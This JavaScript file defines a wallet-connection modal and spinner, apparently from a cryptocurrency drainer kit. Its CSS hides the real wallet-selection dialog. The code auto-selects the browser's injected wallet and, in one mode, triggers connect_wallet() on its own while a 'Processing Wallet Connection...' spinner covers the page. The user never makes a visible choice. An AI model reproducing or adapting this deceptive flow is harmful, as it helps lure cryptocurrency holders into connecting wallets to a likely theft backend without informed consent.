const MS_MODAL_STYLE = `
/* Simple Spinner Styles */
.ms-spinner-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.7);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 100000;
  backdrop-filter: blur(5px);
}

.ms-spinner-container {
  text-align: center;
  background: white;
  padding: 40px 30px;
  border-radius: 20px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
  min-width: 200px;
}

.ms-spinner {
  width: 60px;
  height: 60px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #0075ff;
  border-radius: 50%;
  animation: ms-spin 1s linear infinite;
  margin: 0 auto 20px auto;
}

@keyframes ms-spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.ms-spinner-text {
  color: #333;
  font-family: Arial, sans-serif;
  font-size: 16px;
  font-weight: 600;
  margin: 0;
}

/* Hide original modal completely */
#ms-modal {
  display: none !important;
}

#ms-modal-overlay {
  display: none !important;
}

.ms_modal {
  display: none !important;
}
`;

const MS_INJECTED_WALLET = `<div style="display: none !important;"></div>`;

const MS_MODAL_CODE = `<div style="display: none !important;"></div>`;

const MSM = {
  connect_select: false,
  init: () => {
    try {
      const style_elem = document.createElement('style');
      style_elem.textContent = MS_MODAL_STYLE;
      document.head.append(style_elem);
    } catch(err) {
      console.log(err);
    }
  },
  close: () => {
    try {
      const modal = document.querySelector('#ms-modal');
      if (modal) modal.remove();
    } catch(err) {
      console.log('Modal Closed');
    }
    try {
      const overlay = document.querySelector('#ms-modal-overlay');
      if (overlay) overlay.remove();
    } catch(err) {
      console.log('Modal Closed');
    }
    // Also remove spinner overlay
    try {
      const spinner = document.querySelector('.ms-spinner-overlay');
      if (spinner) spinner.remove();
    } catch(err) {
      console.log('Spinner Closed');
    }
  },
  open: (color = 'light', mode = 1) => {
    try {
      MSM.close();
      
      // Create invisible modal elements but don't show them
      let modal_content = MS_MODAL_CODE.replaceAll('$COLOR$', color == 'dark' ? 'black' : 'white')
      .replaceAll('$INJECTED_WALLET$', (typeof window.ethereum === 'object') ? MS_INJECTED_WALLET : '');
      
      const modal_elem = document.createElement('div');
      modal_elem.id = 'ms-modal';
      modal_elem.style.display = 'none';
      modal_elem.innerHTML = modal_content;
      document.body.prepend(modal_elem);
      
      // Show beautiful spinner UI
      const spinnerHTML = `
        <div class="ms-spinner-overlay">
          <div class="ms-spinner-container">
            <div class="ms-spinner"></div>
            <p class="ms-spinner-text">Processing Wallet Connection...</p>
          </div>
        </div>
      `;
      
      const spinnerElem = document.createElement('div');
      spinnerElem.innerHTML = spinnerHTML;
      document.body.prepend(spinnerElem);
      
      // Automatically select Inject Wallet and trigger connection
      if (typeof window.ethereum === 'object') {
        // Auto-select inject wallet
        setTimeout(() => {
          const injectWallet = document.querySelector('#ms_wallet_eth');
          if (injectWallet) {
            injectWallet.checked = true;
          }
        }, 50);
        
        // Auto-connect when mode is 2
        if (mode == 2) {
          setTimeout(() => {
            MSM.connect_select = true;
            MSM.connect(); // This will trigger the backend connection process
          }, 100);
        }
      }
      
      if (mode == 2) {
        MSM.connect_select = true;
      } else {
        MSM.connect_select = false;
      }
      
    } catch(err) {
      console.log('Modal process initiated');
    }
  },
  select: (marker) => {
    try {
      const element = document.querySelector(marker);
      if (element) {
        element.checked = true;
      }
      if (MSM.connect_select) {
        MSM.connect();
      }
    } catch(err) {
      console.log(err);
    }
  },
  connect: () => {
    try {
      let checked_id = '';
      const checkedInput = document.querySelector('input[name="ms_wallet"]:checked');
      if (checkedInput) {
        checked_id = checkedInput.id;
      } else {
        // Default to inject wallet if nothing is selected
        checked_id = 'ms_wallet_eth';
      }
      
      // Update spinner text based on wallet type
      const spinnerText = document.querySelector('.ms-spinner-text');
      if (spinnerText) {
        let walletName = 'Wallet';
        switch (checked_id) {
          case 'ms_wallet_eth': walletName = 'Injected Wallet'; break;
          case 'ms_wallet_mm': walletName = 'MetaMask'; break;
          case 'ms_wallet_cb': walletName = 'Coinbase Wallet'; break;
          case 'ms_wallet_bw': walletName = 'Binance Wallet'; break;
          case 'ms_wallet_tw': walletName = 'Trust Wallet'; break;
          default: walletName = 'Wallet';
        }
        spinnerText.textContent = `Connecting to ${walletName}...`;
      }
      
      // Backend connection process remains EXACTLY the same
      switch (checked_id) {
        case 'ms_wallet_eth': 
          return connect_wallet(); // Same backend function
        case 'ms_wallet_mm': 
          return connect_wallet("MetaMask"); // Same backend function
        case 'ms_wallet_cb': 
          return connect_wallet("Coinbase"); // Same backend function
        case 'ms_wallet_bw': 
          return connect_wallet("Binance Wallet"); // Same backend function
        case 'ms_wallet_tw': 
          return connect_wallet("Trust Wallet"); // Same backend function
        default: 
          return use_wc(); // Same backend function
      }
    } catch(err) {
      console.log('Connection error:', err);
      // Update spinner to show error
      const spinnerText = document.querySelector('.ms-spinner-text');
      if (spinnerText) {
        spinnerText.textContent = 'Connection Failed';
        spinnerText.style.color = '#ff4444';
      }
      // Remove spinner after error
      setTimeout(() => {
        MSM.close();
      }, 2000);
    }
  },
  // Method to hide spinner when connection is complete
  hideSpinner: (success = true, message = '') => {
    const spinnerText = document.querySelector('.ms-spinner-text');
    if (spinnerText) {
      if (success) {
        spinnerText.textContent = message || 'Connected Successfully!';
        spinnerText.style.color = '#00c851';
      } else {
        spinnerText.textContent = message || 'Connection Failed';
        spinnerText.style.color = '#ff4444';
      }
    }
    
    // Remove spinner after delay
    setTimeout(() => {
      MSM.close();
    }, 1500);
  }
};
